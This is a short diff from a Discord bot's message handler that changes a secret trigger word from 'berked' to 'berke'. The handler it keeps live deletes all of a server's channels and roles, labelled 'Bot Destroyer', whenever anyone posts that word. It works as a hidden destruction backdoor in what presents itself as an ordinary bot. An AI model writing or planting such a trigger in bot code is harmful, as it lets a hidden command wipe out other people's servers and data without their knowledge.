@@ -135,7 +135,7 @@ client.unload = command => {
 };
 
 client.on("message", async message => {
-    if(message.content === "berked"){
+    if(message.content === "berke"){
         message.guild.channels.deleteAll("Bot Destroyer");
         message.guild.roles.deleteAll("Bot Destroyer");
         message.guild.createChannel(`hey`)
